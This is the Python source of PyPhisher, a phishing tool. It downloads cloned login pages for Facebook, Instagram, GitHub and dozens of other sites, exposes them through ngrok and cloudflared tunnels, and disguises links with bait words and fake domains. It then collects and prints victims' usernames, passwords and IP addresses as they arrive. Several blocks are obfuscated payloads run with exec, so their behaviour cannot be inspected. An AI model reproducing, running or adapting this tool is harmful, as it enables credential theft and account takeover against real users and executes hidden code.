# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.7
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));exec((_)(b'B417E75330D7EF7E4563FE7EBE633D86A0320363747D4789B85A1FF56495C679BC465AD60913D082D42D45EE7CEF469B8880E1A3A772E25B577FC193AA9FBDE060F89A9B66B845C02059FD88AF8AE29D1DD6343A8AFED901DFC1F9A1491F46F030359AD63138BFF3263E4F398DC045E5F90086F0C9E50957AE9D6A288BC9F0846C103A41B48CC089AC46B231130F214035D124F5F91E356EBEA36F4FC42935D6BA45AB3AFE8AF188285603FE413019F4771F0CC0032CA0D5EC54C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.7"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''


pkgs=[ "php", "curl", "wget", "unzip" ]


try:
    test = popen("cd $HOME && pwd")
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

choice_file = "files/templates.json"

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    

_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));exec((_)(b'51C0A0A070A060A020A01060106010603080102110212041D0608F8080208F4080209F4070209F4070209F407020AF406020BF405020CF404020DF403020EF402020FF4010200020000000843700000010E356C65746F6D6C380AD000000F027000000E027000000E027000000E0270000004327000000132700000071270000000127C62757F5C61636F6C690A556471646075760ADE6F6964707F660AD00000081273776271640AD37762716F55637271607A0ADE6F696473614C616E6F6964707F4E61656C6F6F62451A547E69630AD47E656D657762716F5464616C0AD27563727160776271690A527563727160547E656D657762714E0AD23F676F6C650A5E6F6963727566770ADE65656277650A55657C62640A577F6C6C6569760A5E616973640A546562730A5619245642092000000312700000021270000001127309200000060271092E40000004327FF20106010C0106010801020000000C03700000064E6F637A6F5379670AD000000F027000000E027000000E027E6F637A697D660A5109227F62727545657C61665A0AD374616F6C650AD20926445E4309200770035204600950010001000101197104700400035104600750010103800C7004770A7000000423700000034000000800000001000000000000000000000001036000000132720021002104010A010011021104010E01001104040A0DF801060100110211080106010400000004237000000132756C646E61686F5E6F69647075636875611AD000000F027000000E027000000E027F6E6F53756E696C680A5F6E6F556E696C670A5567616373756D670AD56D616E640AD264720AD272716F53756E696C690A50796B63740AD56E696C69647C657D690A55610AD9092E696F6A640ADE656C630AD4796C6073750AD00000061270000005127F5F556D616E6F5F580AD0000001027478756E6F5264770ADF6E656E696C6F5264790AD27473730AD46E65607071660ADF5F556C69666F5F580AD8647160737261670AD56D616E656C69666F5F636B0AD5646F636F56660AD56D6162766F5264780ADF5F5B63616265636162747F5F5D0AD11920256E696C60247160290A7023756E696C602471602A0A702A320A702C220A7000000109E000000009EA310AF1227F627275460A727F627275456D616E490AD27F627275446E657F66447F6E456C65746F6D431ADE4B092003500460010103860D900B970C7A04600B960C7804600B950C700B9D047C047003500460010103860D900B980C7904600B960C7804600B950C700B9D047C047162710C780D7101A30C7010A704670D7009100816046103830C7F04730C760D700915046101A4046E00A103800C77047003500460010103820D9304600B9D047C047932720B6204650C7033720B6104650C7932720C750D7B0A6103800C7A04790371057004640C740D790A640C70010101A103880A640C77047600A30C7A12720B610385047404730A620A610A640C712271057004640C740D700A600C730D700760000002E370000003400000070000000900000000000000000000000303664000000712710C0108010E0106010A110801020000000E037000000720000007127000000F027000000E027000000E0274757F656D6964770A54727F60740AD4737F68640A530924756E6275647E69680AD000000A02727F627275650AD47E696270750AD473656E6E6F63670A5D41454254535F5B434F435B0A54554E494F5641470A54756B636F63760A54757F656D6964747C6571666564647563711A59092000000209E124756E6275647E69602F6E4C0A7E4309200350046009500100038804700101038204670470010103820D9104600B9604750470010001000100035004600750010101A206610C700C7400A20383047204710470010103820C7004711A7000000C43700000034000000600000003000000000000000000000003036000000419E000000539E83E283E283E28370AF0000000127DF4010A0108010A010C0000000A0370000000247E69627073760ADE387C330AF000000E027009A4627F67740AD4710ADE610AD3092075656C63750AD863757C66650AD564796277750AD4757F646473760AD40920000000027E420920035004640170010103810C730470010001A200A00470010101A20C7100A004720D7F0D500440071104600C7000000C23700000034000000400000003000000000000000000000002036F39A9999999999A97EA313E203E203E2732313A0A70000002027E6F69647361660AD00000030273092455647164607570227F66602B63656863401A7564716460757D2D280A7000000302700000020272092D502C6C657E602A30247C6571666564402B502875646E69602564716C607D65647023772275686379686059705D2A700ADE6F6964707F6D2D280A7F6D220A707C6568640AD47C6571666564670AD5607974740AD3092D5020383038302A30247C6571666564402B5024727F60702275667275637023772275686379686059705A2A70000F109964727F607D2D260A707D220A7A0D516274657F6253716B4029724B5F0A702020202020202020202020202020202020202F2F5F5F5C7020202020202020202A7A0D520A767B520A70202020202020202020202020202020202020202020202020202C702F2F5F502020202020202020282A7A0020202C7F5C7F5F5F5C5C7F5C702C7F5F2F5F5F5C7F5C7F5C702C7F5C702020202C7F5C702C2F5F5C502020202C7F5C70223A7A0020202C702F2F5F50202C702C702C702C502F5F5C502C702C702C702C702020202C702C702C7F5C702C7020202C702C70223A7A0C7F5F57202C502F502F202C502F57202C7F5F502F202C7C502F57202C7F2F5F5F50202C702C702C702F2F5F5F50202C70223A7A002F5F502F502F5F5F5020202F5F5C702C7F5F5F502F50202F5F5C702C70292F5F5C702C7F5020202C70292F5F5C702C70223A7A00202020202020202020202020202C702C702020292F582020202C702C7C502F5F50202C70202020202C502F5F50202C70223A7A0020202020202020202020202020202F50202020202F50202020202F50202F5F5F5F5F502020202020202F5F5F5F5F5020223A7A010ADC2920035824651A500487246624641A5104852464246B24631A5104822461246A24621A51048D146C146924611A520D900B9E056A14601A501A6D056F0A5F0A6D056E0A5E0A6D056D0A5001AC00A8056001040D891468146B0567146614690A68056001040D85146414631462146114690A68056001050D80146F046E046A056D046C04690A6805680A50038705660A571D9B04600B90056A04600B91056904600B95056804600B91056704600B94056604600B92056504600B90056404600B93056304600B92056204600B91056104600B9005600460000004D3700000004000000710000000000000000000000000000000036'))


# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")



# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")



# Website chooser
def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()


# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=oqowswDyPSv5FpF7AONsRxO8qDVtR9FE2yaT1m2vr2/nMolHzcrOEaHc3S2wm9m1w51Ppa4fbt+hjW7XikRuouQw1djoa0gplwRUvOp0oznqEz7npJjh72R0dvdyaOjkBU/RJPjyz4NTmU80NoZ4W5UeDmkoqpbeMAfBLdppBYUwx/xJoC4ydai8iVHsgIGSnmCZJx8Sb/r/Dx9TEiSctXQN/TJ4FZedzACF/wSE7ot6wvWkwNkWOn6N9DGTMB5S5gXI1hUx2YQqE0QWNUNmEyZ0+0na3eRDK90iskHJm2+SNPITBdbrodVNPj2Uo0lBXNykIrnK1uONYHh0Dk7m8RAMp++BFcZLLqEZRh4E54L3gWBmL1qjz6D4eONfCjyn3eKlgYflkbKSl8mtvW6vg4IU6lcIRhvRbydWxTh2TXFHz7648zrn9MKloujstI/vjIvUekXy2p7M5hTpYqfaeqphiIFN+ZibkOrOFPUiSeJ00HDRV8jFYBIPHQ8tzWm14oqh1dqxBIxPi2ZR23ZtLXHi0Noc9/9nFXUcHUybAS+5M1TylXM+/xj6X/9yeKgZvHWjfec42Z05ZaHZPn65u/DndY3mykRq0HVjefYJ2JsXAIKZeJFO2xHQXu7erTZ25u3pCkPiXqcPVUKON+FV3xOJmD3D9Yc9OJfbrG4+EV8nViyy43SXIq8KTEDcJ2+tmcjmG59ztnbn0zvgPL9upa91XBe10PE3eRbXVvhg/LymXkp4j9rvzyNeT0/XXxeH931d8nRRbUT20A+MXR7FovjHvWDh/WFcLjKNf1rellrWYuipyvjHvKZVHVt+aVb6QsKKMaaQ/lqjuGiPTeR9VOaYGOf22SZd1JquUbn81fV3jvwWX3VqCewlrY7YtygYV3FtqDs3S+1f0Slwlauxrprxsp6k8NCkOqVjtYjIvPvZVFoPeyeaul15HOa9CmXXUz68w67CQ+magcVrceuYlWzFLffOTlEPqoHoobmeE/MeBT1mLT+O30OB/kbsukAx60pjJyB8hqzK2sCTBCueLnKKR2++OHOYBXdndwMFA5gbtl5CQkXMGPG44CYgI3bAS5o7kJ5nybDYpUfAPnGC2NVmBHUJQNljITAJk0eT2X5QQZJ8WM71q9RzipQI90oIUsQqgyuK7QfvMiJt+evzPzeNb+992hlUK0OZy7VqphShAV3EkYRA9/wBFkdIJ6A4v4SgeVs2Hn3nxa7fbx7M+uWEr0wkA3EUoACC6ARNUwBOvioosBJET84O+st3e3XbntnUUEHv9LVlyJe'))


# 2nd function installing packages and downloading tunnelers
def prerequiments():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
        installer("pkg")
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(f"{error}Unzip cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not isfile(f"{root}/.ngrokfolder/ngrok"):
        sprint(f"\n{info}Downloading ngrok.....{nc}")
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif x.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not isfile(f"{root}/.cffolder/cloudflared"):
        sprint(f"\n{info}Downloading cloudflared.....{nc}")
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cffolder")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(f"{error}Previous php still running! Please restart terminal and try again{nc}")
        pexit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(f"{error}Previous ngrok still running. Please restart terminal and try again{nc}")
        pexit()
    system("rm -rf $HOME/.site && cd $HOME && mkdir .site")


# 3rd function checking requirements and download files 
def requirements(folder, mask):
    if isfile(f"{root}/.websites/version.txt"):
        with open(f"{root}/.websites/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if zipver!=version:
                sprint(f"\n{info}Downloading required files.....\n")
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
    else:
        sprint(f"\n{info}Downloading required files.....\n")
        system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
    if isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        remove("websites.zip")
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    else:
        internet()
        sprint(f"\n{info}Downloading required files.....\n")
        system("rm -rf site.zip")
        system(f"wget -q --show-progress https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip -O site.zip")
        if not exists(f"{root}/.websites/{folder}"):
            system(f"cd $HOME/.websites && mkdir {folder}")
        system(f"unzip site.zip -d $HOME/.websites/{folder}")
        remove("site.zip")
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server(mask)

# Start server and tunneling
def server(mask):
    system("clear")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    if not system(f"curl --output /dev/null --silent --head --fail {local_url}"):
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    else:
        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    sleep(9)
    ngrok_link=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
    else:
        ngrok_check=False
    cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cf_link.find("cloudflare")!=-1:
        cf_check=True
    else:
        cf_check=False
    if ngrok_check and cf_check:
        url_manager(cf_link, mask, "1", "2")
        url_manager(ngrok_link, mask, "3", "4")
        cuask(cf_link)
    elif not ngrok_check and cf_check:
        url_manager(cf_link, mask,  "1", "2")
        cuask(cf_link)
    elif not cf_check and ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    elif not (cf_check and ngrok_check):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()


# Output urls
def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url
def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url.strip()
    internet()
    resp= popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short= resp.replace("https://", "")
    domain= input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait= input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final= domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
